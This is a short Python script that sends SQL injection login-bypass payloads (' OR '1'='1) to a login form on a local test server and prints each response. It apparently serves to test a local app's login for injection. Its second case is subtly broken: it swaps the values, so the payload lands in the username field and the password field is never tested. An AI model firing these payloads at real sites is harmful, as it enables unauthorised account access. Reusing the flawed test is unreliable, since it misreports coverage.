import requests

url = "http://127.0.0.1:5000/login"

tests = [
    ("username", "' OR '1'='1", "x"),
    ("password", "alice", "' OR '1'='1"),
]

for field, a, b in tests:
    if field == "username":
        data = {"username": a, "password": b}
    else:
        data = {"username": b, "password": a}

    response = requests.post(url, data=data)

    print("=" * 50)
    print("TEST:", field)
    print("STATUS:", response.status_code)
    print("BODY:", response.text)